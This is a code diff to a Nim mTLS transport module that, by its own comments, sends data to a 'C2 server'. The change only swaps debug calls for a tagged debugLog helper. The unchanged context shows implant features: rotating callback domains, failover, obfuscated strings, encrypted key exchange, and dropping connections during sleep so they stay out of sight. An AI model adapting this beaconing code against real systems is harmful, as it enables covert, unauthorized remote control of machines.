@@ -43,7 +43,7 @@ proc parseDomains(domainsStr: string): seq[tuple[host: string, port: int]] =
         # Default to port 8443 if no port specified
         result.add((host: d, port: 8443))
   except:
-    debug "[DEBUG] mTLS: Failed to parse callback_domains"
+    debugLog "mtls", "mTLS: Failed to parse callback_domains"
 
 proc writeTempCert(data: string, prefix: string): string =
   ## Write PEM data to a temp file and return the path
@@ -79,7 +79,7 @@ proc createSslContext(profile: MtlsProfile): SslContext =
     caPath = writeTempCert(caPem, "mtls_ca")
     profile.certFiles.add(caPath)
 
-  debug "[DEBUG] mTLS: Creating SSL context with client cert auth"
+  debugLog "mtls", "mTLS: Creating SSL context with client cert auth"
 
   result = newContext(
     protVersion = protTLSv1,
@@ -122,9 +122,9 @@ proc newMtlsProfile*(): MtlsProfile =
   # Cleanup temp cert files after context is loaded into memory
   result.cleanupCertFiles()
 
-  debug "[DEBUG] mTLS Profile initialized"
-  debug "[DEBUG] Callback domains: ", $result.callbackDomains.len, " entries"
-  debug "[DEBUG] Domain rotation: ", result.domainRotation
+  debugLog "mtls", "mTLS Profile initialized"
+  debugLog "mtls", "Callback domains: ", $result.callbackDomains.len, " entries"
+  debugLog "mtls", "Domain rotation: ", result.domainRotation
 
 proc selectDomain(profile: var MtlsProfile): tuple[host: string, port: int] =
   ## Select domain based on rotation strategy
@@ -143,7 +143,7 @@ proc connectToServer(profile: var MtlsProfile): bool =
     return true
 
   let domain = profile.selectDomain()
-  debug "[DEBUG] mTLS: Connecting to ", domain.host, ":", $domain.port
+  debugLog "mtls", "mTLS: Connecting to ", domain.host, ":", $domain.port
 
   try:
     profile.socket = newSocket()
@@ -151,10 +151,10 @@ proc connectToServer(profile: var MtlsProfile): bool =
     profile.socket.connect(domain.host, Port(domain.port))
     profile.connected = true
     profile.failCount = 0
-    debug "[DEBUG] mTLS: Connected successfully"
+    debugLog "mtls", "mTLS: Connected successfully"
     return true
   except:
-    debug "[DEBUG] mTLS: Connection failed: ", getCurrentExceptionMsg()
+    debugLog "mtls", "mTLS: Connection failed: ", getCurrentExceptionMsg()
     profile.connected = false
     profile.failCount += 1
 
@@ -163,7 +163,7 @@ proc connectToServer(profile: var MtlsProfile): bool =
        profile.failCount >= profile.failoverThreshold:
       profile.currentDomainIndex = (profile.currentDomainIndex + 1) mod profile.callbackDomains.len
       profile.failCount = 0
-      debug "[DEBUG] mTLS: Failover threshold reached, switching to domain index ", $profile.currentDomainIndex
+      debugLog "mtls", "mTLS: Failover threshold reached, switching to domain index ", $profile.currentDomainIndex
 
     return false
 
@@ -176,7 +176,7 @@ proc sendLengthPrefixed(socket: Socket, message: string) =
   lenBytes[2] = byte((messageLen shr 8) and 0xFF)
   lenBytes[3] = byte(messageLen and 0xFF)
 
-  debug "[DEBUG] mTLS: Sending ", $messageLen, " bytes"
+  debugLog "mtls", "mTLS: Sending ", $messageLen, " bytes"
 
   # Send length prefix
   var sent = 0
@@ -195,7 +195,7 @@ proc recvLengthPrefixed(socket: Socket): string =
   while read < 4:
     let n = socket.recv(addr lenBytes[read], 4 - read)
     if n <= 0:
-      debug "[DEBUG] mTLS: Connection closed while reading length"
+      debugLog "mtls", "mTLS: Connection closed while reading length"
       return ""
     read += n
 
@@ -205,46 +205,46 @@ proc recvLengthPrefixed(socket: Socket): string =
                    (lenBytes[2].uint32 shl 8) or
                    lenBytes[3].uint32
 
-  debug "[DEBUG] mTLS: Expecting ", $messageLen, " bytes"
+  debugLog "mtls", "mTLS: Expecting ", $messageLen, " bytes"
 
   if messageLen == 0 or messageLen > 100_000_000: # 100MB sanity check
-    debug "[DEBUG] mTLS: Invalid message length: ", $messageLen
+    debugLog "mtls", "mTLS: Invalid message length: ", $messageLen
     return ""
 
   # Read payload
   result = socket.recv(messageLen.int)
-  debug "[DEBUG] mTLS: Received ", $result.len, " bytes"
+  debugLog "mtls", "mTLS: Received ", $result.len, " bytes"
 
 proc send*(profile: var MtlsProfile, data: string, callbackUuid: string = ""): string =
   ## Send data to C2 server via mTLS raw socket
   let uuid = if callbackUuid.len > 0: callbackUuid else: profile.config.uuid
 
-  debug "[DEBUG] === SENDING DATA VIA mTLS ==="
+  debugLog "mtls", "=== SENDING DATA VIA mTLS ==="
   try:
     let jsonData = parseJson(data)
     if data.len < 2048:
-      debug "[DEBUG] Request JSON:"
+      debugLog "mtls", "Request JSON:"
       debug jsonData.pretty()
     else:
-      debug "[DEBUG] Request: Large payload (", data.len, " bytes)"
+      debugLog "mtls", "Request: Large payload (", data.len, " bytes)"
       if jsonData.hasKey(obf("action")):
-        debug "[DEBUG] Action: ", jsonData["action"].getStr()
+        debugLog "mtls", "Action: ", jsonData["action"].getStr()
   except:
-    debug "[DEBUG] Request data (first 500 chars): ", data[0..<min(500, data.len)]
+    debugLog "mtls", "Request data (first 500 chars): ", data[0..<min(500, data.len)]
 
   # Encrypt or encode payload
   var payload: string
   if profile.aesKey.len > 0 and callbackUuid.len > 0:
-    debug "[DEBUG] Encrypting payload with AES-256-CBC+HMAC"
+    debugLog "mtls", "Encrypting payload with AES-256-CBC+HMAC"
     payload = encryptPayload(data, profile.aesKey, uuid)
   else:
-    debug "[DEBUG] Sending unencrypted payload (Base64 only)"
+    debugLog "mtls", "Sending unencrypted payload (Base64 only)"
     payload = encode(uuid & data)
 
   # Ensure connection (reconnect if needed)
   if not profile.connected:
     if not profile.connectToServer():
-      debug "[DEBUG] mTLS: Cannot send - not connected"
+      debugLog "mtls", "mTLS: Cannot send - not connected"
       return ""
 
   try:
@@ -255,16 +255,16 @@ proc send*(profile: var MtlsProfile, data: string, callbackUuid: string = ""): s
     let rawResponse = recvLengthPrefixed(profile.socket)
 
     if rawResponse.len == 0:
-      debug "[DEBUG] mTLS: Empty response, marking disconnected"
+      debugLog "mtls", "mTLS: Empty response, marking disconnected"
       profile.connected = false
       return ""
 
     # Decrypt or decode response
     if profile.aesKey.len > 0 and callbackUuid.len > 0:
-      debug "[DEBUG] Decrypting response with AES-256-CBC+HMAC"
+      debugLog "mtls", "Decrypting response with AES-256-CBC+HMAC"
       result = decryptPayload(rawResponse, profile.aesKey)
     else:
-      debug "[DEBUG] Decoding Base64 response"
+      debugLog "mtls", "Decoding Base64 response"
       let decoded = decode(rawResponse)
       if decoded.len > 36:
         result = decoded[36..^1]
@@ -273,21 +273,21 @@ proc send*(profile: var MtlsProfile, data: string, callbackUuid: string = ""): s
 
     # Log response
     if result.len > 0:
-      debug "[DEBUG] === RECEIVED mTLS RESPONSE ==="
+      debugLog "mtls", "=== RECEIVED mTLS RESPONSE ==="
       try:
         let jsonResp = parseJson(result)
         if result.len < 2048:
-          debug "[DEBUG] Response JSON:"
+          debugLog "mtls", "Response JSON:"
           debug jsonResp.pretty()
         else:
-          debug "[DEBUG] Response: Large payload (", result.len, " bytes)"
+          debugLog "mtls", "Response: Large payload (", result.len, " bytes)"
           if jsonResp.hasKey(obf("action")):
-            debug "[DEBUG] Action: ", jsonResp["action"].getStr()
+            debugLog "mtls", "Action: ", jsonResp["action"].getStr()
       except:
-        debug "[DEBUG] Response data (first 500 chars): ", result[0..<min(500, result.len)]
+        debugLog "mtls", "Response data (first 500 chars): ", result[0..<min(500, result.len)]
 
   except:
-    debug "[DEBUG] mTLS send failed: ", getCurrentExceptionMsg()
+    debugLog "mtls", "mTLS send failed: ", getCurrentExceptionMsg()
     profile.connected = false
     result = ""
 
@@ -302,7 +302,7 @@ proc hasAesKey*(profile: MtlsProfile): bool =
 
 proc cleanup*(profile: var MtlsProfile) =
   ## Close TLS connection to avoid keeping ESTABLISHED connections during sleep
-  debug "[DEBUG] mTLS: Cleaning up connection"
+  debugLog "mtls", "mTLS: Cleaning up connection"
   if profile.connected:
     try:
       profile.socket.close()
@@ -312,17 +312,17 @@ proc cleanup*(profile: var MtlsProfile) =
 
 proc reconnect*(profile: var MtlsProfile) =
   ## Re-establish TLS connection after cleanup
-  debug "[DEBUG] mTLS: Reconnecting..."
+  debugLog "mtls", "mTLS: Reconnecting..."
   discard profile.connectToServer()
 
 proc performKeyExchange*(profile: var MtlsProfile): tuple[success: bool, newUuid: string] =
   ## Perform RSA key exchange to establish AES session key
   if not profile.config.encryptedExchange:
-    debug "[DEBUG] No key exchange required (ENCRYPTED_EXCHANGE_CHECK=F)"
+    debugLog "mtls", "No key exchange required (ENCRYPTED_EXCHANGE_CHECK=F)"
     return (true, "")
 
   when not encryptedExchange:
-    debug "[DEBUG] RSA not compiled in (ENCRYPTED_EXCHANGE_CHECK not set at build time)"
+    debugLog "mtls", "RSA not compiled in (ENCRYPTED_EXCHANGE_CHECK not set at build time)"
     return (true, "")
   else:
     var p = profile
@@ -337,5 +337,5 @@ proc performKeyExchange*(profile: var MtlsProfile): tuple[success: bool, newUuid
     elif exchangeResult.success:
       return (true, "")
     else:
-      debug "[DEBUG] Key exchange failed: ", exchangeResult.error
+      debugLog "mtls", "Key exchange failed: ", exchangeResult.error
       return (false, "")
